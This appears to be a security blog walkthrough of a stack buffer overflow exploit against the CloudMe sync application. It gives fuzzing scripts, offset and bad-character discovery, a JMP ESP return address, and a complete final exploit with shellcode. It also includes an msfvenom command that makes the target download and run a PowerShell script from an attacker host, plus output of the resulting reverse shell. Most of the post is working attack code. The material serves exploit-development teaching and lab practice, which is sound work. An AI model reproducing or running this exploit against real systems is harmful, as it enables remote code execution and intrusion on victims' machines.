---
layout: post
title: CloudMe - BufferOverflow
tags: [BoF, Windows]
description: "CloudMe - BufferOverflow"
---
## Vulnerabilty System: 192.168.0.104

- [Introduction](#introduction)
- [Crashing the application](#crashing-the-application)
- [Identifying the EIP offset](#identifiying-the-eip-offset)
- [Finding Available Shellcode Space](#Findong-for-bad-charecteres)
- [Testing for Bad Characters](#testing-for-bad-characteres)
- [Finding a JMP ESP Return Address](#finding-a-jmp-esp.return.address)
- [Generating and Adding Shellcode](#generating-and-adding-shellcode)
- [Gaining Remote Access](#gaining-remote-access)

![logo](/assets/imgs/cloudme/logo.png)

PoC: [ExploitDB](https://www.exploit-db.com/exploits/48389)

## Inreoduction

Stack buffer overflow is a **memory corruption** vulnerability that occurs when a program writes more data to a buffer located on the stack than what is actually allocated for that buffer, therefore overflowing to a memory address that is outside of the intended data structure.

This will often cause the program to crash, and if certain conditions are met, it could allow an attacker to gain remote control of the machine with privileges as high as the user running the program, by redirecting the flow execution of the application to malicious code.

-----

## Crashing the application

Before creating our fuzzer, we started the CloudMe application to synchronize it with the InmunityDebugger.

![cloudme](/assets/imgs/cloudme/cloudme.png)

Immunity Debugger uses the following panes used to display information:

- Top-Left Pane – It contains the instruction offset, the original application code, its assembly instruction and comments added by the debugger.
- Bottom-Left Pane -It contains the hex dump of the application itself.
- Top-Right Pane – It contains the CPU registers and their current value.
- Bottom-Right Pane – It contains the Memory stack contents.

We will use **Python3** to generate a 5000 A's character buffer to test the lock:

```
#!/usr/bin/python3
import socket,time

buffer=b"A"*5000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",8888))

s.send(buffer)
```

![fuzzer](/assets/imgs/cloudme/fuzzer.png)

-----

## Dentifying the EIP offset

The next required step is to identify which part of the buffer lands in the EIP register, and then modify it and control the flow of program execution. Since all that was sent was a bunch of A's, at the moment there is no way to know which part has overwritten EIP.

The Metasploit **pwn** tool can be used to create a randomly generated string that will replace the A characters to identify which part lands in EIP:

> Installation: pip install pwn-tools

```
❯ pwn cyclic 5000
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaa [...]
```

modifying the script.

```
#!/usr/bin/python3
import socket,time

buffer=b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaacka [...]

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",8888))

s.send(buffer)
```

The randomly generated pattern was sent instead of the A characters.

The application crashed with an access violation error as expected, but this time the EIP record was overwritten with the characters ```naak```"

![eip](/assets/imgs/cloudme/eip.png)

------

## Finding Available Shellcode Space

```
❯ pwn cyclic -l "naak" 2>/dev/null
1052
```

We restart the application, reattach Immunity Debugger and run the script:

```
#!/usr/bin/python3
import socket,time

buffer=b"A" * 1052 + b"B" * 4 + b"C" * 200

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",8888))

s.send(buffer)
```

As expected, the EIP record was overwritten with the four "B" characters:

![eipcontrol](/assets/imgs/cloudme/eipcontrol.png)

------

## Testing for Bad Characters

Some programs will often consider certain characters as "**bad**", and the only thing that means is that if they are found with one of them, this will cause a corruption of the rest of the data contained in the instruction sent to the application, not allowing the program interpret it correctly. A character that is almost always considered bad is x00, since it is a null byte and terminates the rest of the application code.

> For the generation of the characters, the badchars utility of python was used

> Installation: pip install badchars

```
badchars -f python
```

Modify the script, add all possible characters in hexadecimal format to a badchars variable and send it in place of the shell code placeholder:

```
#!/usr/bin/python3
import socket

badchars=(
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = b"A" * 1052 + b"B" * 4 + badchars + b"C"*100

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",8888))

s.send(buffer)
```

Restart the application, reattach Immunity Debugger, and run the script:

![dump](/assets/imgs/cloudme/dump.png)

In this case the only badchar that has been observed is "\ 00"

------

## Finding a JMP ESP Return Address

Now that we can control EIP and find a suitable location for our shellcode (ESP), we need to redirect the flow of program execution to ESP, so that it executes the shellcode. To do this, we need to find a valid JMP ESP instruction address, which allows us to "jump" to ESP.

For the address to be valid, it must not be compiled with ASLR support and cannot contain any of the incorrect characters found above, since the program needs to be able to interpret the address to perform the jump.

Restarting the application, reattaching the immunity debugger and using the command ```!mona modules``` to find a valid module/DLL:

![mona_modules](/assets/imgs/cloudme/mona_modules.png)

Finding a valid opcode for the JMP ESP - FFE4 instruction is what we need:

link: [https://defuse.ca/online-x86-assembler.htm#disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly)

![jmp](/assets/imgs/cloudme/jmp.png)

Using the ```!mona find``` to with command to find valid pointers to the JMP ESP instruction:

* Not Valid

![/assets/imgs/cloudme/dll_notfound.png]

* Valid

![cloudmedll](/assets/imgs/cloudme/cloudmedll.png)

It appears that a valid pointer (0x007db4f9) was found and does not contain any of the wrong characters.

The following Mona command can also be used to find a valid pointer to a JMP ESP instruction address:

```
!mona jmp -r esp -cpb bad_characters
```

-----

## Generating and Adding Shellcode

At this point, we can fully control the flow of program execution, so all that's left to do is add our shell code to the exploit to trigger a reverse shell.

The shell code can be generated using MSFvenom with the following flags:

```
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.106:8000/PS.ps1')" lhost=192.168.0.106 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c
```

Change the script by replacing the "B" characters used for the EIP record with the newly found JMP ESP instruction address.

The EIP return address must be entered backwards, as little endian stores bytes in memory in reverse order.

For this case I use the pack function of the struct module to avoid placing the reverse order

final exploit

```
#!/usr/bin/python3

import socket
from struct import pack

shellcode=(
b"\xba\xee\x49\x50\xfa\xdd\xc2\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
b"\x46\x83\xc6\x04\x31\x56\x0e\x03\xb8\x47\xb2\x0f\xb8\xb0\xb0"
b"\xf0\x40\x41\xd5\x79\xa5\x70\xd5\x1e\xae\x23\xe5\x55\xe2\xcf"
b"\x8e\x38\x16\x5b\xe2\x94\x19\xec\x49\xc3\x14\xed\xe2\x37\x37"
b"\x6d\xf9\x6b\x97\x4c\x32\x7e\xd6\x89\x2f\x73\x8a\x42\x3b\x26"
b"\x3a\xe6\x71\xfb\xb1\xb4\x94\x7b\x26\x0c\x96\xaa\xf9\x06\xc1"
b"\x6c\xf8\xcb\x79\x25\xe2\x08\x47\xff\x99\xfb\x33\xfe\x4b\x32"
b"\xbb\xad\xb2\xfa\x4e\xaf\xf3\x3d\xb1\xda\x0d\x3e\x4c\xdd\xca"
b"\x3c\x8a\x68\xc8\xe7\x59\xca\x34\x19\x8d\x8d\xbf\x15\x7a\xd9"
b"\xe7\x39\x7d\x0e\x9c\x46\xf6\xb1\x72\xcf\x4c\x96\x56\x8b\x17"
b"\xb7\xcf\x71\xf9\xc8\x0f\xda\xa6\x6c\x44\xf7\xb3\x1c\x07\x92"
b"\x42\x92\x32\xd0\x45\xac\x3c\x45\x2e\x9d\xb7\x0a\x29\x22\x12"
b"\x6f\xd5\xc0\xb6\x9a\x7e\x5d\x53\x27\xe3\x5e\x8e\x64\x1a\xdd"
b"\x3a\x15\xd9\xfd\x4f\x10\xa5\xb9\xbc\x68\xb6\x2f\xc2\xdf\xb7"
b"\x65\xb2\xb0\x30\xe3\x40\x3c\xd7\x8e\xc8\xae\x07\x18\x55\x77"
b"\x60\xd4\x30\xf0\x5d\xa7\xd8\x94\xf8\x54\x68\x49\x4d\xfe\xe4"
b"\xa7\x06\x65\x66\xfb\xc4\x0c\x03\x95\x60\xe6\xe5\x0d\xe6\x8f"
b"\x97\xa1\x97\x0e\x03\x69\x1c\xa3\xa2\xe3\xbb\x6b\x13\x94\x37"
b"\x18\x2b\x5e\x97\xcf\xfa\xa7\xd5\x21\xcd\xe1\x21\x10\x1d\x20"
b"\x63\x5c\x6b\x06\xbb\xac\xa3\x46\x94\x9c\x90\x88\x9a\x6f\x27"
b"\xf2\x73\x90"
)

## \xf9\xb4\x7d\x00

payload = b"A"*1052 + pack("<I",0x007db4f9) + b"\x90"*20 + shellcode

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",8888))

s.send(payload)
```

------

## Gaining Remote Access

We execute the created script obtaining a session by powershell

```
❯ python3 exploit.py

───────────────────────────────────────────────────────────────────────
❯ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.0.104 - - [16/Aug/2021 23:40:27] "GET /PS.ps1 HTTP/1.1" 200 -

───────────────────────────────────────────────────────────────────────
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.106] from (UNKNOWN) [192.168.0.104] 49301
Windows PowerShell running as user win7bits on WIN7
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\win7bits\AppData\Local\Programs\CloudMe\CloudMe>whoami
win7\win7bits
```
